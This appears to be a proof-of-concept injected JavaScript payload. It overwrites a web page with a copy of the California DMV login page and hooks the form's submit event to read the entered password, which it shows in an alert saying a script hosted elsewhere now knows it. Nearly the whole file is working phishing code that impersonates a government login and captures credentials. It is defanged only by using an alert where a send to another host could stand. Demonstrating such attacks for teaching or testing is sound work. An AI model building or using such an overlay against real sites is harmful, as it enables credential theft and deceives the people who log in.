//alert("this ran from some_script.js");
//now rewrite this page to look like the login page.

document.body.innerHTML=`
<!DOCTYPE html>
<html class="wf-playfairdisplay-n7-active wf-playfairdisplay-n4-active wf-playfairdisplay-n6-active wf-sourcesanspro-n4-active wf-sourcesanspro-n7-active wf-active" lang="en">

<div class="dos-header-notice info">
			<div class="container container--full">
				<div class="dos-content"></div>
			</div>
		</div>
    <a class="skip-link screen-reader-text" href="#main">Skip to
        content</a>
    <header class="site-header" id="js-site-header" role="banner" itemscope="itemscope" itemtype="http://schema.org/WPHeader">
        <div class="site-header__inner">
            <div class="site-header__top-bar">
                <div class="container container--full">
                    <div class="site-header__ca-logo">
                        <img class="site-header__ca-logo-img" src="/../imageserver/theme_10up/images/logo-ca-gov.svg" alt="California State Logo"> <span class="screen-reader-text">State of California</span>
                    </div>
                    <a class="site-header__ca-dmv-logo" href="https://www.dmv.ca.gov/portal/"> <img class="site-header__ca-dmv-logo-img" src="/../imageserver/theme_10up/images/logo-ca-dmv-white.svg" alt="California State Department of Motor Vehicles Logo"> <span class="screen-reader-text">State of California Department
                            of Motor Vehicles</span>
                    </a>
                    <div class="site-header__top-bar-links"></div>
                    <google-translate></google-translate>
                    <a href="#js-site-header__main-nav" id="js-menu-toggle" class="site-menu-toggle" aria-expanded="false" aria-controls="js-primary-nav"> <span class="screen-reader-text">Primary Menu</span>
                        <div class="burger-menu" id="js-burger-menu">
                            <div class="burger"></div>
                        </div>
                    </a>
                </div>
            </div>
            <div class="site-header__main">
                <div class="container container--full">
                    <div class="site-header__main-nav" id="js-site-header__main-nav">
                        <nav id="js-nav-primary" class="nav-primary" role="navigation" itemscope="itemscope" itemtype="http://schema.org/SiteNavigationElement" aria-label="Primary Navigation">
                            <div class="menu-primary-menu-container">
                                <ul id="js-utility-nav__nav-menu" class="nav-primary__menu">
                                    <li id="14" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-14">
                                        <a href="https://www.dmv.ca.gov/portal/"> Home </a>
                                    </li>
                                </ul>
                            </div>
                        </nav>
                    </div>
                </div>
            </div>
        </div>
    </header>
    
	<main id="main" class="main" role="main">

		<div class="hero hero--tab">
			<div class="container container--full">
				<div class="hero__content">
					<h1 class="hero__title">LOG IN</h1>
				</div>
			</div>
		</div>

		<div class="page-wrapper">

			<div class="container container--full">

				<div
					class="content-wrapper content-wrapper--pad content-wrapper--offset">

					<div class="content-block">
						<div class="heading-wrapper heading-wrapper--hr">
							<h2 class="heading heading-3">Welcome Back</h2>
						</div>

						<noscript>
							<p>
								<strong>WARNING:</strong> To maintain your log in session, make
								sure that your browser is configured to accept Cookies.
							</p>
						</noscript>

						<div id="errors-container" class="notify-block heading">
							<div class="notify error">
								<div class="notify-block__content">
									<p></p>
								</div>
							</div>
						</div>
						<p>
							<strong>Not Registered?</strong> In order to log in, you will
							first need to
							<strong><a id="acct-create-href"
								href="/mga/sps/authsvc?PolicyId=urn:ibm:security:authentication:asf:dmvUscAccountCreate"
								class="env-link">create an account</a>. 
							</strong>
						</p>
						<form id="idm-form" name="form" action="/pkmslogin.form"
							method="post" autocomplete="off">
							<fieldset class="dmv-field-group">

								<div class="dmv-input dmv-input--row dmv-input--lg">
									<div class="dmv-input__field-col">
										<label for="username">Email</label> <input type="email"
											id="username" name="username" minlength="4" maxlength="125"
											placeholder="Email" autofocus="autofocus" required="required">
										<p>
											<a id="pre-rereg-href" href="/mga/sps/authsvc?PolicyId=urn:ibm:security:authentication:asf:dmvUscPreReRegister">
													No longer have access to your email address?</a>
										</p>
									</div>
								</div>

								<div class="dmv-input dmv-input--row dmv-input--lg">
									<div class="dmv-input__field-col">
										<label for="password">Password</label> <input type="password"
											id="password" name="password" placeholder="Password"
											required="required">

										<p>
											<a id="forgot-password-href" href="/mga/sps/authsvc?PolicyId=urn:ibm:security:authentication:asf:dmvUscPasswordReset">Forgot
												your password?</a>
										</p>
									</div>
								</div>

								<div class="dmv-input">
									<div class="dmv-cta-group">
										<button class="btn btn-primary" type="submit"
											id="login-button">Log in</button>
									</div>
								</div>
							</fieldset>

							<input type="hidden" name="login-form-type" value="pwd" />
						</form>

						<div>
							<h3>Additional Information</h3>
							<ul>
								<li><a target="_blank" rel="noopener noreferrer" href="/portal/privacy-and-security/">Privacy and
										Security</a></li>
								<li><a
									target="_blank" rel="noopener noreferrer" href="/portal/customer-service/report-an-issue-or-complaint/dmv-technical-support/">Technical
										Support</a></li>
							</ul>
						</div>
					</div>
				</div>

			</div>

		</div>

	</main>

    <footer class="footer-main">
        <nav class="nav-footer container container-wide" itemscope="itemscope" itemtype="http://schema.org/SiteNavigationElement" aria-label="Footer Navigation"></nav>
        <div class="container container-wide">
            <div class="copyright-social horiz space-between">
                Copyright &copy;
                <script>
                document.write(new Date().getFullYear())
                </script>
                State of California
            </div>
        </div>
    </footer>
    <script type="text/javascript" src="/../imageserver/theme_10up/js/frontend.js"></script>
    <div id="move-helper-text" style="position: absolute; top: -999em; left: -999em;">Some
        areas of this page may shift around if you resize the browser window.
        Be sure to check heading and document order.</div>
    <script src="/js/wsi-util.js" type="text/javascript"></script>
`;
document.querySelector('form').addEventListener("submit",()=>{
alert("this page was generated by a script hosted from some random location and it knows that your password is "+document.querySelector('#password').value)+"It could have allowed you to quietly continue, not realizing that anything went wrong."});
